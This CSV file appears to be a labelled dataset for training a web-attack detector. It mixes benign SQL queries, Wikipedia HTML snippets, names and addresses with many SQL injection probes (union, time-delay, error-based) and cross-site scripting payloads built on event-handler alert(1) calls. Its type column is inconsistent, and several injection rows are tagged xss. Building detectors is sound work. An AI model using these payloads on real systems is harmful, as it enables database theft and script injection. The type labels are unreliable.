Text,Label,type
<input3 onpointerdown=alert(1)>XSS</input3>,2,xss
"<output ondblclick=""alert(1)"">test</output>",2,xss
4.22605E+15,0,xss
7.05723E+15,0,sql
"<li id=""cite_note-303""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-303"">^ </a> </b> ",0,xss
"  SELECT worker AS cabin, broad AS [torn]  FROM breathe",0,sql
SELECT * FROM border 3,0,sql
porter,0,sql
"<shadow onbeforecut=""alert(1)"" contenteditable>test</shadow>",2,xss
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,2,xss
"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",1,sql
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",1,sql
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionend=alert(1)></tr>",2,xss
SELECT * FROM poetry 3 SELECT * FROM indicate,0,sql
"          <dd><a href=""/en/1.1/"">1.1</a></dd>",0,xss
"1'+  (  select thmg where 2546  =  2546 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1%'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
SELECT writer ( s )  FROM entire SELECT thirty ( s ) ,0,sql
11690,0,sql
<rt id=x tabindex=1 onbeforedeactivate=alert(1)></rt><input autofocus>,2,xss
"<body onmouseenter=""alert(1)"">test</body>",2,xss
8.17915E+15,0,sql
-7231   )    )    union all select 7639#,1,sql
"<noframes onbeforecopy=""alert(1)"" contenteditable>test</noframes>",2,xss
select * from users where id  =  1 %  (  \  )   or 1  =  1 -- 1,1,xss
"<li id=""cite_note-Symbolic_vs._sub-symbolic-18""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Symbolic_vs._sub-symbolic_18-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Symbolic_vs._sub-symbolic_18-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'peyy'  =  'peyy",1,sql
"<nextid draggable=""true"" ondragenter=""alert(1)"">test</nextid>",2,xss
"1'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"<li><a href=""/wiki/Situation_calculus"" title=""Situation calculus"">Situation calculus </a> </li>",0,xss
"<header draggable=""true"" ondragleave=""alert(1)"">test</header>",2,xss
-9429'  )   order by 1--,1,xss
"1'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,xss
1' where 9381  =  9381,1,xss
SELECT MIN ( hall )  AS thing FROM either,0,sql
-6766'   )    )     )   or 3038  =  3038,1,sql
"c/ elvas 112, 13-a",0,sql
"select count  (  *  )   from generate_series  (  1,5000000  )  -- gqkk",1,sql
"<li><a href=""#CITEREFNewquist1994"">Newquist 1994 </a>, pp.&#160;301–318 </li> </ul>",0,xss
"<dd onmousemove=""alert(1)"">test</dd>",2,xss
SELECT * FROM private WHERE perfect BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT * FROM neck,0,sql
"1""  )   as tecq where 4817  =  4817 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
SELECT second ( s ) FROM house INNER JOIN,0,xss
"  SELECT IFNULL ( NULL, ""W3Schools.com"" ) ;",0,xss
"<li id=""cite_note-285""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-285"">^ </a> </b> ",0,xss
"c/ la hortensia, s/n",0,sql
" select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",1,sql
" SELECT COUNT ( CustomerID ) , Country FROM Customers GROUP BY Country HAVING COUNT ( CustomerID )  > 5  ORDER BY COUNT ( CustomerID )  DESC;",0,sql
"  SELECT higherID AS ID, wagon AS tree FROM seven",0,sql
1%'   )    )     )   and 2006  =  2006,1,xss
SELECT * FROM promised WHERE shout BETWEEN black09/01/1996nearly AND jungle15/31/1996move,0,sql
"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
SELECT * FROM basket  WHERE joy NOT LIKE '[blow]%',0,sql
"  SELECT GREATEST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;",0,sql
"<BODY BACKGROUND=""javascript:alert('')"">",2,xss
del ngel kercad,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
" SELECT * FROM minute ORDER BY alike ASC, push DESC",0,xss
"   SELECT frighten, number, hornFROM summer WHERE worth  IS NOT NULL",0,sql
ornela,0,sql
SELECT * FROM thirty WHERE shine = 'remove'  OR official = 'pure',0,xss
"<li><cite id=""CITEREFMinsky1967"" class=""citation book""><a href=""/wiki/Marvin_Minsky"" title=""Marvin Minsky"">Minsky, Marvin </a> (1967). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/computationfinit0000mins""><i>Computation: Finite and Infinite Machines </i> </a> ",0,xss
"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sql
"<li><img alt=""Category"" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png"" decoding=""async"" title=""Category"" width=""16"" height=""14"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/24px-Folder_Hexagonal_Icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/32px-Folder_Hexagonal_Icon.svg.png 2x"" data-file-width=""36"" data-file-height=""31"" /> <b><a href=""/wiki/Category:Computer_science"" title=""Category:Computer science"">Category </a> </b> </li>",0,xss
<dt onpointerleave=alert(1)>XSS</dt>,2,xss
<svg><html onload=alert(1)></html>,2,xss
"1'||  (  select 'fdkl' where 4572  =  4572 union all select null,null,null,null,null,null,null,null,null#",1,sql
SELECT * FROM theory FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM something,0,sql
<img2 onpointerenter=alert(1)>XSS</img2>,2,xss
leiza,0,sql
2a6in6rosa,0,sql
"-2276""   )    )    as qwow where 2321  =  2321 or 3534  =  2971--",1,sql
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1,sql
<del onpointerenter=alert(1)>XSS</del>,2,xss
<element onpointerleave=alert(1)>XSS</element>,2,xss
1' in boolean mode  )   waitfor delay '0:0:5'#,1,xss
"c/ codigo correspondencia oficial correos-telegrafos 71, 10d",0,sql
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",1,sql
"  SELECT Orders.layersrID, Employees.when, Employees.struggle FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.whenID ORDER BY Orders.woolID",0,sql
"	 </span> <span class=""reference-text""><cite class=""citation book"">Sikos, Leslie F. (June 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.springer.com/us/book/9783319540658""><i>Description Logics in Multimedia Reasoning </i> </a>. Cham: Springer. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2F978-3-319-54066-5"">10.1007/978-3-319-54066-5 </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-3-319-54066-5"" title=""Special:BookSources/978-3-319-54066-5""><bdi>978-3-319-54066-5 </bdi> </a>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170829120912/https://www.springer.com/us/book/9783319540658"">Archived </a> from the original on 29 August 2017. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Description+Logics+in+Multimedia+Reasoning&amp;rft.place=Cham&amp;rft.pub=Springer&amp;rft.date=2017-06&amp;rft_id=info%3Adoi%2F10.1007%2F978-3-319-54066-5&amp;rft.isbn=978-3-319-54066-5&amp;rft.aulast=Sikos&amp;rft.aufirst=Leslie+F.&amp;rft_id=https%3A%2F%2Fwww.springer.com%2Fus%2Fbook%2F9783319540658&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
wakefiel7,0,sql
"   SELECT COUNT ( won ) , push FROM guide BY produce",0,sql
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,xss
rousseau,0,xss
rigby,0,sql
"<progress onmouseover=""alert(1)"">test</progress>",2,xss
SELECT * FROM dog,0,xss
SELECT * FROM barn WHERE sheet NOT BETWEEN 'century' AND 'health',0,sql
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1,sql
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",1,sql
SELECT TOP 3 * FROM second WHERE region = 'expect' SELECT * FROM hard,0,sql
SELECT * FROM machinery,0,sql
refriega,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2766' LIMIT 1,0,sql
60781516z,0,sql
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sql
 </p>,0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=MIT+Technology+Review&amp;rft.atitle=Boston+may+be+famous+for+bad+drivers%2C+but+it%27s+the+testing+ground+for+a+smarter+self-driving+car&amp;rft.date=2017&amp;rft.aulast=Knight&amp;rft.aufirst=Will&amp;rft_id=https%3A%2F%2Fwww.technologyreview.com%2Fs%2F608871%2Ffinally-a-driverless-car-with-some-common-sense%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<embed onpointerdown=alert(1)>XSS</embed>,2,xss
"   SELECT setting, planned+ ', ' + movement+ ' ' + string+ ', ' + solid AS suggest  FROM stove",0,sql
SELECT * FROM discover WHERE stems = 'church'  OR pilot = 'coach',0,sql
SELECT * FROM north ORDER BY use DESC,0,sql
"<wbr oncopy=""alert(1)"" contenteditable>test</wbr>",2,xss
"<plaintext ondblclick=""alert(1)"">test</plaintext>",2,xss
SELECT * FROM feet  WHERE passage = function,0,sql
SELECT before FROM know UNION SELECT fifty FROM learn ORDER BY every,0,sql
34830,0,xss
end and   (  'jzlr'  =  'jzlr,1,sql
<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>,2,xss
SELECT TOP 50 PERCENT * FROM element,0,sql
13750,0,xss
"  SELECT yourselfID AS ID, highest AS break FROM sad",0,xss
"1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,xss
"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030",1,sql
" SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country AS Address  FROM Customers;",0,xss
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/History_of_artificial_intelligence"" title=""History of artificial intelligence"">History of artificial intelligence </a> and <a href=""/wiki/Timeline_of_artificial_intelligence"" title=""Timeline of artificial intelligence"">Timeline of artificial intelligence </a> </div>",0,xss
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,1,sql
9159,0,sql
"  SELECT gradeID AS ID, over AS entirely FROM but",0,xss
SELECT * FROM cabin WHERE minerals BETWEEN account09/01/1996beginning AND exist15/31/1996beside,0,xss
"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",2,xss
SELECT * FROM across,0,sql
"<li id=""cite_note-FOOTNOTEKatz2012-178""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEKatz2012_178-0"">^ </a> </b> ",0,xss
stankova@carrillo-de-albornoz.pt,0,sql
1 where 5161  =  5161 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
"-3749"" or elt  (  1032  =  1032,3623  )   and ""mzrw""  =  ""mzrw",1,sql
"<li><a href=""/wiki/Monism"" title=""Monism"">Monism </a> </li>",0,xss
<div onpointerout=alert(1)>XSS</div>,2,xss
SELECT * FROM shoot WHERE anyone = 'signal'  OR count = 'rear',0,sql
<thead onpointerdown=alert(1)>XSS</thead>,2,xss
1%'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',1,sql
1.94093E+15,0,sql
"calle jaen 186, 8h",0,sql
1'  )   as upgb where 2031  =  2031,1,sql
quintino,0,sql
" SELECT * FROM coming ORDER BY curve ASC, bigger DESC",0,xss
c/ galvan 98 10?a,0,xss
menospreciativo,0,sql
albertini_trauberg@theroxyblue.jo,0,xss
22496795n,0,sql
"<style>@keyframes x{}</style><br style=""animation-name:x"" onanimationend=""alert(1)""></br>",2,xss
"	 </span> <span class=""toctext"">External links ",0,xss
"-5417 or elt  (  1032  =  1032,3623  )  ",1,sql
SELECT * FROM prepare ORDER BY hearing,0,xss
-1304'  )   union all select 7639#,1,sql
"-7737'||  (  select 'xalo' where 9219  =  9219 union all select 9219,9219,9219,9219#",1,sql
"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,sql
"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--",1,sql
"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",1,sql
SELECT TOP 3 * FROM roar WHERE tomorrow = 'light',0,sql
"iif  (  4460  =  1610,1,1/0  )  ",1,sql
"<canvas onclick=""alert(1)"">test</canvas>",2,xss
"1'||  (  select 'tmsj' where 2971  =  2971 union all select null,null,null,null,null,null,null,null,null,null#",1,sql
	 </span> 2018 ,0,xss
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,2,xss
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'lwir' like 'lwir",1,sql
"<address onkeyup=""alert(1)"" contenteditable>test</address>",2,xss
maximinio,0,sql
"  SELECT Orders.strongerrID, Employees.usual, Employees.tobacco FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.metID ORDER BY Orders.taskID",0,sql
"1""  )   where 1144  =  1144 and 2006  =  2006",1,sql
"<a href=""/wiki/Gaussian_mixture_model"" class=""mw-redirect"" title=""Gaussian mixture model"">Gaussian mixture model </a>,<sup id=""cite_ref-Gaussian_mixture_model_226-0"" class=""reference""><a href=""#cite_note-Gaussian_mixture_model-226"">&#91;218&#93; </a> </sup> and the extremely popular <a href=""/wiki/Naive_Bayes_classifier"" title=""Naive Bayes classifier"">naive Bayes classifier </a>.<sup id=""cite_ref-228"" class=""reference""><a href=""#cite_note-228"">&#91;i&#93; </a> </sup><sup id=""cite_ref-Naive_Bayes_classifier_229-0"" class=""reference""><a href=""#cite_note-Naive_Bayes_classifier-229"">&#91;220&#93; </a> </sup> Classifier performance depends greatly on the characteristics of the data to be classified, such as the dataset size, distribution of samples across classes, the dimensionality, and the level of noise. Model-based classifiers perform well if the assumed model is an extremely good fit for the actual data. Otherwise, if no matching model is available, and if accuracy (rather than speed or scalability) is the sole concern, conventional wisdom is that discriminative classifiers (especially SVM) tend to be more accurate than model-based classifiers such as ""naive Bayes"" on most practical data sets.<sup id=""cite_ref-Classifier_performance_230-0"" class=""reference""><a href=""#cite_note-Classifier_performance-230"">&#91;221&#93; </a> </sup><sup id=""cite_ref-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary_231-0"" class=""reference""><a href=""#cite_note-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary-231"">&#91;222&#93; </a> </sup>",0,xss
raqu$9omo,0,sql
SELECT * FROM book  WHERE house NOT LIKE '[bean]%',0,sql
stetson,0,sql
 </li>,0,xss
	 </span></a>.</dd>,0,xss
SELECT * FROM involved WHERE daughter IN  ( SELECT leaf FROM thin ) ,0,sql
SELECT DISTINCT wire FROM impossible,0,sql
SELECT negative ( s )  FROM various,0,sql
SELECT AVG ( black ) FROM problem,0,sql
1'+  (  select 'mzee' where 5984  =  5984,1,sql
ballonga,0,sql
"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  '",1,sql
"<marquee onbeforecut=""alert(1)"" contenteditable>test</marquee>",2,xss
SELECT DAYOFWEEK ( CURDATE (   )  )  ;,0,sql
"1 where 5627  =  5627 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,xss
"<li><a href=""/wiki/Computer_accessibility"" title=""Computer accessibility"">Accessibility </a> </li> </ul>",0,xss
SELECT TOP 50 PERCENT * FROM town SELECT * FROM please FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM now,0,xss
-6327'   )    )    union all select 2685--,1,sql
"<rt onmousemove=""alert(1)"">test</rt>",2,xss
-7021' or 3038  =  3038,1,sql
39395797v,0,xss
"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""alert(1)""></p>",2,xss
union select * from users where login   =   char ...,1,sql
SELECT * FROM grain WHERE positive = 'matter'  OR remember = 'warm',0,xss
irina,0,sql
1  )   where 6472  =  6472,1,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;127–133 </li> </ul>",0,xss
SELECT * FROM met WHERE even = 'certainly'  OR property = 'consonant',0,sql
